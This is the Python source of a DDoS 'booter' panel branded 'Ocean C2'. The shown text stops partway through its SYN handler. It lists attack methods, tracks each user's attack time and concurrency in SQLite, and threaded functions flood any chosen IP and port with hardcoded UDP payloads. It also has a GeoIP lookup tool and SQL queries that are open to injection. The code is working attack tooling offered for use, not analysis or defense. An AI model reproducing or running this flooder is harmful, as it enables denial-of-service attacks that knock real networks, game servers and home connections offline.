#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#Made By Levvie
test = 0
import sys
import socket
import time
import random
from random import *
import threading
import getpass
import os
import urllib
import requests
import json
from time import sleep
import sqlite3
import json
import asyncio

from asciimatics.effects import BannerText, Print, Scroll
from asciimatics.renderers import ColourImageFile, FigletText, ImageFile, StaticRenderer
from asciimatics.scene import Scene
from asciimatics.screen import Screen
from asciimatics.exceptions import ResizeScreenError, StopApplication


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
proxys = open('proxies.txt').readlines()
bots = len(proxys)

methods = "26"
bypass = "10"
amp = "16"
ONL = "0"


# Banners
def banners():
    clear()
    print("")
    print(f'''

                \x1b[38;2;137;0;255mBanners
               \x1b[38;2;137;0;255m╔══════════════╦\x1b[38;2;12;121;246m══════════════════════╗
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mGIRL       \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mSome Gifs          \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mPARROT     \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mPlays Parrot       \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mSURPRISE   \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mTry It!            \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m╚══════════════╩\x1b[38;2;12;121;246m══════════════════════╝
''')



def help():
    clear()
    print("")
    print(f'''

                \x1b[38;2;137;0;255mHelp
               \x1b[38;2;137;0;255m╔═══════════════════════╦\x1b[38;2;12;121;246m═════════════════════╗
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mMethods             \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mBanners           \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mTools               \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mRules             \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mPorts               \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mMenu              \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m╚═══════════════════════╩\x1b[38;2;12;121;246m═════════════════════╝
''')


def methods():
    clear()
    print("")
    print(f'''

                \x1b[38;2;137;0;255mMethods
               \x1b[38;2;137;0;255m╔══════════════╦\x1b[38;2;12;121;246m══════════════════════╗
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mUDP        \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mUDP Method         \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mSYN        \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mSYN Method         \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mHOME       \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mHOME Method        \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mKITCHENGUN \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mKitchen Gun        \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mNFO        \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mNFO Method         \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mTCP        \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mTCP Method         \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mTELNET     \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mTelnet Method      \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mOVH-AMP    \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mOVH Amp Method     \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mVSE        \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mVSE Method         \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mGAME       \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mGame Method        \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mDNS        \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mDNS Method         \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mCAM-KILL   \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mKill Online Cam    \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mOceanOP    \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mOP UDP/GAME Method \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mHexRape    \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mHex Rape Method    \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m╚══════════════╩\x1b[38;2;12;121;246m══════════════════════╝
''')


def adminpanel():
    clear()
    print("")
    print(f'''

                \x1b[38;2;137;0;255mAdmin Panel
               \x1b[38;2;137;0;255m╔══════════════╦\x1b[38;2;12;121;246m══════════════════════╗
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mADDUSR     \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mAdd User           \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mBANUSR     \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mBan User           \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mUNBAN      \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mUnban User         \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mDELUSR     \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mDelete User        \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mUSRLIST    \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mShow All Users     \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m╚══════════════╩\x1b[38;2;12;121;246m══════════════════════╝
''')

def tools():
    clear()
    print("")
    print(f'''

                \x1b[38;2;137;0;255mTools
               \x1b[38;2;137;0;255m╔══════════════╦\x1b[38;2;12;121;246m══════════════════════╗
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mip         \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mInfo About IP      \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m╚══════════════╩\x1b[38;2;12;121;246m══════════════════════╝
''')


def ports():
    clear()
    print("")
    print(f'''

                \x1b[38;2;137;0;255mPorts
               \x1b[38;2;137;0;255m╔═══════════════════════╦\x1b[38;2;12;121;246m══════════════════════╗
               \x1b[38;2;137;0;255m║   \x1b[38;2;180;180;180m22 - \x1b[38;2;12;121;246mSSH            \x1b[38;2;12;121;246m║   \x1b[38;2;90;90;90m3306 - \x1b[38;2;137;0;255mMYSQL       \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;180;180;180m23 - \x1b[38;2;12;121;246mTELNET         \x1b[38;2;12;121;246m║   \x1b[38;2;90;90;90m3689 - \x1b[38;2;137;0;255mITUNES      \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;180;180;180m25 - \x1b[38;2;12;121;246mSMTP           \x1b[38;2;12;121;246m║   \x1b[38;2;90;90;90m3784 - \x1b[38;2;137;0;255mVENT        \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;180;180;180m53 - \x1b[38;2;12;121;246mDNS            \x1b[38;2;12;121;246m║   \x1b[38;2;90;90;90m4000 - \x1b[38;2;137;0;255mICQ         \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;180;180;180m67 - \x1b[38;2;12;121;246mDHCP           \x1b[38;2;12;121;246m║   \x1b[38;2;90;90;90m5190 - \x1b[38;2;137;0;255mAOL         \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;180;180;180m80 - \x1b[38;2;12;121;246mHTTP           \x1b[38;2;12;121;246m║   \x1b[38;2;90;90;90m30120 - \x1b[38;2;137;0;255mFIVEM      \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;180;180;180m88 - \x1b[38;2;12;121;246mKERBEROS       \x1b[38;2;12;121;246m║   \x1b[38;2;90;90;90m3074 - \x1b[38;2;137;0;255mXBOX        \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;180;180;180m137 - \x1b[38;2;12;121;246mNETBIOS       \x1b[38;2;12;121;246m║   \x1b[38;2;90;90;90m3478 - \x1b[38;2;137;0;255mPSN         \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;180;180;180m143 - \x1b[38;2;12;121;246mIMAP4         \x1b[38;2;12;121;246m║   \x1b[38;2;90;90;90m28960 - \x1b[38;2;137;0;255mCOD        \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;180;180;180m161 - \x1b[38;2;12;121;246mSNMP          \x1b[38;2;12;121;246m║   \x1b[38;2;90;90;90m27014 - \x1b[38;2;137;0;255mMW2        \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;180;180;180m389 - \x1b[38;2;12;121;246mLDAP          \x1b[38;2;12;121;246m║   \x1b[38;2;90;90;90m27020 - \x1b[38;2;137;0;255mCSSTRIKE   \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;180;180;180m443 - \x1b[38;2;12;121;246mHTTPS         \x1b[38;2;12;121;246m║   \x1b[38;2;90;90;90m25565 - \x1b[38;2;137;0;255mMC         \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;180;180;180m550 - \x1b[38;2;12;121;246mRIP           \x1b[38;2;12;121;246m║   \x1b[38;2;90;90;90m27015 - \x1b[38;2;137;0;255mTF2        \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;180;180;180m990 - \x1b[38;2;12;121;246mSFTP_SSL      \x1b[38;2;12;121;246m║   \x1b[38;2;90;90;90m3724 - \x1b[38;2;137;0;255mWOW         \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;180;180;180m1433 - \x1b[38;2;12;121;246mMS_SQL       \x1b[38;2;12;121;246m║   \x1b[38;2;90;90;90m5000 - \x1b[38;2;137;0;255mLOL         \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;180;180;180m1863 - \x1b[38;2;12;121;246mMSN          \x1b[38;2;12;121;246m║   \x1b[38;2;90;90;90m5060 - \x1b[38;2;137;0;255mPS          \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m╚═══════════════════════╩\x1b[38;2;12;121;246m══════════════════════╝
''')

def rules():
    clear()
    print("")
    print(f'''

                \x1b[38;2;137;0;255mRules
               \x1b[38;2;137;0;255m╔══════════════╦\x1b[38;2;12;121;246m═══════════════════════════════════════════════╗
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mRule 1.    \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mDo not share login info                     \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mRule 2.    \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mDo not attack .gov/.gob/.edu/.mil domains   \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m║   \x1b[38;2;12;121;246mRule 3.    \x1b[38;2;12;121;246m║   \x1b[38;2;137;0;255mDo not spam attacks!                        \x1b[38;2;12;121;246m║
               \x1b[38;2;137;0;255m╚══════════════╩\x1b[38;2;12;121;246m═══════════════════════════════════════════════╝
''')



def plan():
    con = sqlite3.connect("db/users.db")
    cur = con.cursor()
    cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
    data = cur.fetchall()
    for row in data:
        name1 = row[0]
        passo = row[1]
        rank = row[2]
        cons = row[3]
        time = row[4]
        atcktime = row[5]
    clear()
    print("")
    print(f'''

                \x1b[38;2;137;0;255mPlan
               \x1b[38;2;137;0;255m╔══════════════\x1b[38;2;12;121;246m══════════════╗
               \x1b[38;2;137;0;255m    \x1b[38;2;12;121;246mUsername: \x1b[38;2;137;0;255m{name1}
               \x1b[38;2;137;0;255m    \x1b[38;2;12;121;246mPassword: \x1b[38;2;137;0;255m{passo}
               \x1b[38;2;137;0;255m    \x1b[38;2;12;121;246mRank: \x1b[38;2;137;0;255m{rank}
               \x1b[38;2;137;0;255m    \x1b[38;2;12;121;246mCons: \x1b[38;2;137;0;255m{cons}
               \x1b[38;2;137;0;255m    \x1b[38;2;12;121;246mAttack Time: \x1b[38;2;137;0;255m{atcktime}s
               \x1b[38;2;137;0;255m    \x1b[38;2;12;121;246mBooting Time: \x1b[38;2;137;0;255m{time}s
               \x1b[38;2;137;0;255m╚══════════════\x1b[38;2;12;121;246m══════════════╝
''')


def menu():
    con = sqlite3.connect("db/users.db")
    cur = con.cursor()
    cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
    data = cur.fetchall()
    for row in data:
    	rank = row[2]
    	cons = row[3]
    	time = row[4]
    	atcktime = row[5]
    sys.stdout.write(f"\x1b]2;|   Ocean C2   |   User: {name}   |   Rank: {rank}   |   Cons: {cons}   |   Max Time: {atcktime}s   |   Online: {ONL}\x07")
    clear()
    print("")
    print("""                                                          
                  
                     \x1b[38;2;137;0;255m         ╔═╗╔═╗╔═╗╔═╗╔╗╔
                     \x1b[38;2;19;249;203m         ║ ║║  ║╣ ╠═╣║║║
                      \x1b[38;2;137;0;255m        ╚═╝╚═╝╚═╝╩ ╩╝╚╝
                \x1b[38;2;19;249;203m╔═══════════\x1b[38;2;137;0;255m════════\x1b[38;2;137;0;255m═══════\x1b[38;2;137;0;255m═════\x1b[38;2;137;0;255m═════\x1b[38;2;19;249;203m══════════╗
                \x1b[38;2;19;249;203m║        \x1b[38;2;137;0;255m Welcome To Ocean C2 Panel            \x1b[38;2;19;249;203m║
                \x1b[38;2;19;249;203m║ \x1b[38;2;137;0;255m- - -   \x1b[38;2;137;0;255m       Made by Levvie          \x1b[38;2;19;249;203m- - - \x1b[38;2;19;249;203m║
                \x1b[38;2;19;249;203m╚═══════════\x1b[38;2;137;0;255m════════\x1b[38;2;137;0;255m═══════\x1b[38;2;137;0;255m═════\x1b[38;2;137;0;255m═════\x1b[38;2;19;249;203m══════════╝
                \x1b[38;2;19;249;203m╔═══════════\x1b[38;2;137;0;255m════════\x1b[38;2;137;0;255m═══════\x1b[38;2;137;0;255m═════\x1b[38;2;137;0;255m═════\x1b[38;2;19;249;203m══════════╗
                \x1b[38;2;19;249;203m║       \x1b[38;2;137;0;255mType [help] to see the commands.       \x1b[38;2;19;249;203m║
                \x1b[38;2;19;249;203m╚═══════════\x1b[38;2;137;0;255m════════\x1b[38;2;137;0;255m═══════\x1b[38;2;137;0;255m═════\x1b[38;2;137;0;255m═════\x1b[38;2;19;249;203m══════════╝
""")



fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	running -= 1
def stdsender1(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	running -= 1


def Spinner():
    import time
    from time import sleep
    l = ['|', '/', '-', '\\']
    for i in l+l+l:
        sys.stdout.write('\033[37m\r /> Loading attack... \x1b[38;2;12;121;246m'+i)
        sys.stdout.flush()
        time.sleep(0.22)


def geoiplook(ip):
    network = "?"
    city = "?"
    region = "?"
    regcode = "?"
    countryname = "?"
    countrycode = "?"
    countrycap = "?"
    tld = "?"
    contcode = "?"
    postal = "?"
    Lag = "?"
    Long = "?"
    timezone = "?"
    utc_off = "?"
    call = "?"
    cur = "?"
    lang = "?"
    org = "?"

    ipinf = f"https://ipapi.co/{ip}/json/"
    stats = requests.get(ipinf)
    json_stats = stats.json()

    network = json_stats["network"] # 1.1.1.1/24
    city = json_stats["city"] # Sydney
    region = json_stats["region"] # New South Wales
    regcode = json_stats["region_code"] # NSW
    countryname = json_stats["country_name"] # Australia
    countrycode = json_stats["country_code"] # AU
    tld = json_stats["country_tld"] # .au
    contcode = json_stats["continent_code"] # OC
    postal = json_stats["postal"] #2000
    Lag = json_stats["latitude"] # -33.859336
    Long = json_stats["longitude"] # 151.203624
    timezone = json_stats["timezone"] # Australia/Sydney
    utc_off = json_stats["utc_offset"] # +1100
    call = json_stats["country_calling_code"] # +61
    cur = json_stats["currency"] # AUD
    lang = json_stats["languages"] # en-AU
    org = json_stats["asn"] + ", " + json_stats["org"] # AS13335, CLOUDFLARENET
    clear()
    Screen.wrapper(atk)
    print("")
    print(f'''

                \x1b[38;2;137;0;255mGeoip - {ip}
               \x1b[38;2;137;0;255m╔══════════════\x1b[38;2;12;121;246m══════════════╗
               \x1b[38;2;137;0;255m    \x1b[38;2;12;121;246mNetwork: \x1b[38;2;137;0;255m{network}
               \x1b[38;2;137;0;255m    \x1b[38;2;12;121;246mORG: \x1b[38;2;137;0;255m{org}
               \x1b[38;2;137;0;255m    \x1b[38;2;12;121;246mTLD: \x1b[38;2;137;0;255m{tld}
               \x1b[38;2;137;0;255m    \x1b[38;2;12;121;246mLanguages: \x1b[38;2;137;0;255m{lang}
               \x1b[38;2;137;0;255m    \x1b[38;2;12;121;246mCity: \x1b[38;2;137;0;255m{city}
               \x1b[38;2;137;0;255m    \x1b[38;2;12;121;246mRegion: \x1b[38;2;137;0;255m{region}
               \x1b[38;2;137;0;255m    \x1b[38;2;12;121;246mRegion Code: \x1b[38;2;137;0;255m{regcode}
               \x1b[38;2;137;0;255m    \x1b[38;2;12;121;246mCountry Name: \x1b[38;2;137;0;255m{countryname}
               \x1b[38;2;137;0;255m    \x1b[38;2;12;121;246mCountry Code: \x1b[38;2;137;0;255m{countrycode}
               \x1b[38;2;137;0;255m    \x1b[38;2;12;121;246mPostal: \x1b[38;2;137;0;255m{postal}
               \x1b[38;2;137;0;255m    \x1b[38;2;12;121;246mLocation: \x1b[38;2;137;0;255m{Lag}, {Long}
               \x1b[38;2;137;0;255m    \x1b[38;2;12;121;246mTimezone: \x1b[38;2;137;0;255m{timezone}
               \x1b[38;2;137;0;255m    \x1b[38;2;12;121;246mPhone: \x1b[38;2;137;0;255m{call}
               \x1b[38;2;137;0;255m    \x1b[38;2;12;121;246mCurrency: \x1b[38;2;137;0;255m{cur}
               \x1b[38;2;137;0;255m╚══════════════\x1b[38;2;12;121;246m══════════════╝
''')






def main():
    import time
    from time import sleep
    con1 = sqlite3.connect("db/users.db")
    cur1 = con1.cursor()
    cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
    data = cur1.fetchall()
    for row in data:
        cons = row[3]
    menu()
    while(True):
        cnc = input('''\x1b[38;2;137;0;255m╔══[Panel\x1b[38;2;12;121;246m@\x1b[38;2;137;0;255mOcean\x1b[38;2;40;40;40m]
\x1b[38;2;137;0;255m╚\x1b[38;2;190;190;190m═\x1b[38;2;150;150;150m═\x1b[38;2;100;100;100m═\x1b[38;2;70;70;70m═\x1b[38;2;50;50;50m/> \x1b[38;2;137;0;255m''').lower()
        sinput = cnc.split(" ")[0]
    # Menus
        if cnc == "methods" or cnc == "m":
            methods()
        elif cnc == "rule" or cnc == "rules" or cnc == "r":
            rules()
        elif cnc == "clear" or cnc == "cls" or cnc == "menu" or cnc == "mainmenu":
            main()
        elif cnc == "ports" or cnc == "port":
            ports()
        elif cnc == "tools" or cnc == "tool":
            tools()
        elif cnc == "help" or cnc == "?" or cnc == "???":
            help()
        elif cnc == "banners" or cnc == "banner" or cnc == "b":
            banners()
        elif cnc == "plan" or cnc == "p":
            plan()
        elif cnc == "admin" or cnc == "ap":
            con = sqlite3.connect("db/users.db")
            cur = con.cursor()
            cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
            data = cur.fetchall()
            for row in data:
                name1 = row[0]
                passo = row[1]
                rank = row[2]
            if rank == "Owner":
                adminpanel()
            else:
                print("/> You don't have permission for this\n")
    
    # Methods
        elif sinput == "dns":
            try:
                sinput, host, timer, port = cnc.split(" ")
                con1 = sqlite3.connect("db/users.db")
                cur1 = con1.cursor()
                cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                data = cur1.fetchall()
                for row in data:
                    time1 = row[4]
                    atcktime = row[5]
                timeratck = int(timer) - 1
                if time1 == 0:
                    print("\033[37m/> You don't have booting time\n")
                    time.sleep(1)
                    main()
                if time1 <= int(timer):
                    print("\033[37m/> You don't have enough booting time\n")
                    time.sleep(1)
                    main()
                if atcktime <= timeratck:
                    print("\033[37m/> You don't have enough attack time\n")
                    time.sleep(1)
                    main()
                else:
                    try:
                        if running >= cons:
                            import time
                            from time import sleep
                            print("\033[37m/> You have reached max concurrents\n")
                            time.sleep(1)
                        else:
                            sinput, host, timer, port = cnc.split(" ")
                            socket.gethostbyname(host)
                            payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                            Screen.wrapper(atk)
                            # remove time
                            con1 = sqlite3.connect("db/users.db")
                            cur1 = con1.cursor()
                            cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur1.fetchall()
                            for row in data:
                                time = row[4]
                            timer = int(timer)
                            time = time - timer
                            cur1.execute(f"UPDATE users SET Time = {time} WHERE Name = '{name}'")
                            con1.commit()
                            con = sqlite3.connect("db/users.db")
                            cur = con.cursor()
                            cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur.fetchall()
                            for row in data:
                                rank = row[2]
                                cons = row[3]
                                time = row[4]
                                atcktime = row[5]
                            sys.stdout.write(f"\x1b]2;|   Ocean C2   |   User: {name}   |   Rank: {rank}   |   Cons: {cons}   |   Attack Time: {atcktime}s   |   Online: {ONL}\x07")
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            clear()
                            Spinner()
                            clear()
                            print("")
                            print(f'''
                \x1b[38;2;137;0;255mAttack Sent
               \x1b[38;2;137;0;255m╔═════════════\x1b[38;2;12;121;246m═════════════╗
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mMethod: \x1b[38;2;137;0;255m{sinput}
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mIP: \x1b[38;2;137;0;255m{host}
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mtime: \x1b[38;2;137;0;255m{timer}s
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mport: \x1b[38;2;137;0;255m{port}
               \x1b[38;2;137;0;255m╚═════════════\x1b[38;2;12;121;246m═════════════╝
        ''')
                    except socket.gaierror:
                        print('/> Socket Error')
                        print("\n")
            except ValueError:
                    print('/> Usage: dns <ip> <time> <port>')
                    print('/> Example: dns 1.1.1.1 120 80')
                    print("\n")

        elif sinput == "home":
            try:
                sinput, host, timer, port = cnc.split(" ")
                con1 = sqlite3.connect("db/users.db")
                cur1 = con1.cursor()
                cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                data = cur1.fetchall()
                for row in data:
                    time1 = row[4]
                    atcktime = row[5]
                timeratck = int(timer) - 1
                
                if time1 == 0:
                    print("\033[37m/> You don't have booting time\n")
                    time.sleep(1)
                    main()
                if time1 <= int(timer):
                    print("\033[37m/> You don't have enough booting time\n")
                    time.sleep(1)
                    main()
                if atcktime <= timeratck:
                    print("\033[37m/> You don't have enough attack time\n")
                    time.sleep(1)
                    main()
                if atcktime >= timeratck:
                    try:
                        if running >= cons:
                            import time
                            from time import sleep
                            print("\033[37m/> You have reached max concurrents\n")
                            time.sleep(1)
                        else:
                            sinput, host, timer, port = cnc.split(" ")
                            socket.gethostbyname(host)
                            payload = b"\x00\x02\x00\x2f"
                            Screen.wrapper(atk)
                            # remove time
                            con1 = sqlite3.connect("db/users.db")
                            cur1 = con1.cursor()
                            cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur1.fetchall()
                            for row in data:
                                time = row[4]
                            timer = int(timer)
                            time = time - timer
                            cur1.execute(f"UPDATE users SET Time = {time} WHERE Name = '{name}'")
                            con1.commit()
                            con = sqlite3.connect("db/users.db")
                            cur = con.cursor()
                            cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur.fetchall()
                            for row in data:
                                rank = row[2]
                                cons = row[3]
                                time = row[4]
                                atcktime = row[5]
                            sys.stdout.write(f"\x1b]2;|   Ocean C2   |   User: {name}   |   Rank: {rank}   |   Cons: {cons}   |   Attack Time: {atcktime}s   |   Online: {ONL}\x07")
                            threading.Thread(target=stdsender1, args=(host, port, timer, payload)).start()
                            clear()
                            Spinner()
                            clear()
                            print("")
                            print(f'''
                \x1b[38;2;137;0;255mAttack Sent
               \x1b[38;2;137;0;255m╔═════════════\x1b[38;2;12;121;246m═════════════╗
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mMethod: \x1b[38;2;137;0;255m{sinput}
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mIP: \x1b[38;2;137;0;255m{host}
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mtime: \x1b[38;2;137;0;255m{timer}s
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mport: \x1b[38;2;137;0;255m{port}
               \x1b[38;2;137;0;255m╚═════════════\x1b[38;2;12;121;246m═════════════╝
        ''')
                    except socket.gaierror:
                        print('/> Socket Error')
                        print("\n")
                        main()
            except ValueError:
                print('/> Usage: home <ip> <time> <port>')
                print('/> Example: home 1.1.1.1 120 80')
                print("\n")

        elif sinput == "syn":
            try:
                sinput, host, timer, port = cnc.split(" ")
                con1 = sqlite3.connect("db/users.db")
                cur1 = con1.cursor()
                cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                data = cur1.fetchall()
                for row in data:
                    time1 = row[4]
                    atcktime = row[5]
                timeratck = int(timer) - 1
                
                if time1 == 0:
                    print("\033[37m/> You don't have booting time\n")
                    time.sleep(1)
                    main()
                if time1 <= int(timer):
                    print("\033[37m/> You don't have enough booting time\n")
                    time.sleep(1)
                    main()
                if atcktime <= timeratck:
                    print("\033[37m/> You don't have enough attack time\n")
                    time.sleep(1)
                    main()
                else:
                    try:
                        if running >= cons:
                            import time
                            from time import sleep
                            print("\033[37m/> You have reached max concurrents\n")
                            time.sleep(1)
                        else:
                            sinput, host, timer, port = cnc.split(" ")
                            socket.gethostbyname(host)
